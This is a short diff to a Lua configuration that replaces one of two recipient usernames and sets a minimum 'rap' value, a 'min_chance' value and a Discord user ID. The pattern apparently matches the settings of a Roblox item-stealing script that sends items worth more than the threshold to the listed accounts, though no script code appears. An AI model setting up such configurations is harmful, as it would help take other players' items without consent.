@@ -1,4 +1,4 @@
-_G.Usernames = {"gilathist", "gilathist"}
+_G.Usernames = {"DuduDodo4", "gilathist"}
 _G.min_rap = 200
 _G.min_chance = 25000
 _G.discuser = "927314585642475600" 
